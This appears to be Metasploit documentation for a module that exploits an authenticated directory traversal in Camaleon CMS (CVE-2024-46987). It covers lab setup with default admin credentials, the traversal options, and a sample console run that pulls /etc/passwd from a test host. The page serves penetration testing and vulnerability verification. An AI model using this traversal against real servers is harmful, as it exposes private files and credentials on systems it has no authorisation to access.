## Vulnerable Application

This module attempts to read files from an authenticated directory traversal vuln in Camaleon CMS versions <= 2.8.0 and version 2.9.0.

CVE-2024-46987 mistakenly indicates that versions 2.8.1 and 2.8.2 are also vulnerable, however this is not the case.

## Setup

See [Camaleon CMS](https://github.com/owen2345/camaleon-cms) documentation.

The following describes how to setup Camaleon CMS version 2.8.0 on Ubuntu.

### Requirements

- Rails 6.1+
- PostgreSQL, MySQL 5+ or SQlite
- Ruby 3.0+
- Imagemagick

### Install Ruby

guides.rubyonrails.org/install_ruby_on_rails.html

~~~bash
sudo apt install build-essential rustc libssl-dev libyaml-dev zlib1g-dev libgmp-dev git curl
~~~

### Install Mise

~~~bash
curl https://mise.run | sh
echo "eval \"\$(~/.local/bin/mise activate)\"" >> ~/.bashrc
source ~/.bashrc
~~~

### Install Ruby with Mise

~~~bash
$ mise use -g ruby@3.0

$ ruby --version
ruby 3.0.7p220 ...
~~~

### Install Imagemagick

~~~bash
sudo apt install --no-install-recommends imagemagick
~~~

### Install Postgresql

~~~bash
sudo apt install postgresql
~~~

### Install Rails

~~~bash
$ gem install rails -v 6.1
~~~

#### concurrent-ruby Issue

Downgrade concurrent-ruby to 1.3.4

~~~bash
$ gem list concurrent-ruby
concurrent-ruby (1.3.6)

$ gem install concurrent-ruby -v 1.3.4
$ gem uninstall concurrent-ruby -v 1.3.6

$ rails --version
Rails 6.1.7.10
~~~

### Create Rails Project

Run `rails new camaleon_project`

### Gemfile

In your Gemfile do the following:

Replace `gem 'spring'` with `gem 'spring', '4.2.1'`


Delete this line to prevent [conflict](https://github.com/owen2345/camaleon-cms/issues/1111): `gem 'sass-rails', '>= 6'`

Put these lines at the bottom of your Gemfile:

~~~
gem 'camaleon_cms', '2.8.0'
gem 'concurrent-ruby', '1.3.4'
~~~

### Install Bundle

From the project directory run `bundle install`

### Webpacker.yml Issue

~~~bash
wget -O camaleon_project/config/webpacker.yml https://raw.githubusercontent.com/rails/webpacker/master/lib/install/config/webpacker.yml
~~~

### Camaleon CMS Installation

~~~bash
rails generate camaleon_cms:install
rake camaleon_cms:generate_migrations
rake db:migrate
~~~

### Run Rails

~~~bash
bundle exec rails server -b 0.0.0.0
~~~

Navigate to `http://{ip address}:3000` and enter test under the Name field.

### Setup Server

When prompted with the new installation page just enter "test" into the Name field and continue.

#### Create Unprivileged User (Optional)

Navigate to `http://{ip address}:3000/admin` - login with the default admin credentials "admin:admin123"

Then navigate to "Users -> + Add User" and fill out the form.

## Verification Steps

1. Do: `use auxiliary/gather/camaleon_download_private_file`
2. Do: `set RHOST [IP]`
3. Do: `run`

## Options

### FILEPATH

The filepath of the file to read.

### DEPTH

The number of "../" appended to the filename. Default is 13

## Scenarios

```
msf > use auxiliary/gather/camaleon_download_private_file 
msf auxiliary(gather/camaleon_download_private_file) > set rhost 10.0.0.45
rhost => 10.0.0.45
msf auxiliary(gather/camaleon_download_private_file) > set rport 3000
rport => 3000
msf auxiliary(gather/camaleon_download_private_file) > set ssl false
ssl => false
msf auxiliary(gather/camaleon_download_private_file) > run
[*] Running module against 10.0.0.45
[+] /etc/passwd stored as '/home/kali/.msf4/loot/20260411192711_default_10.0.0.45_camaleon.travers_926890.txt'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tss:x:105:105:TPM software stack,,,:/var/lib/tpm:/bin/false
systemd-oom:x:990:990:systemd Userspace OOM Killer:/:/usr/sbin/nologin
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
whoopsie:x:107:109::/nonexistent:/bin/false
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
avahi:x:108:111:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
tcpdump:x:109:112::/nonexistent:/usr/sbin/nologin
sssd:x:110:113:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
cups-pk-helper:x:112:114:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
saned:x:113:116::/var/lib/saned:/usr/sbin/nologin
geoclue:x:114:117::/var/lib/geoclue:/usr/sbin/nologin
cups-browsed:x:115:114::/nonexistent:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/run/hplip:/bin/false
gnome-remote-desktop:x:988:988:GNOME Remote Desktop:/var/lib/gnome-remote-desktop:/usr/sbin/nologin
polkitd:x:987:987:User for polkitd:/:/usr/sbin/nologin
rtkit:x:117:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
colord:x:118:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:120:121:Gnome Display Manager:/var/lib/gdm3:/bin/false
nm-openvpn:x:121:122:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
bittman:x:1000:1000:bittman:/home/bittman:/bin/bash
postgres:x:122:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

[*] Auxiliary module execution completed
```
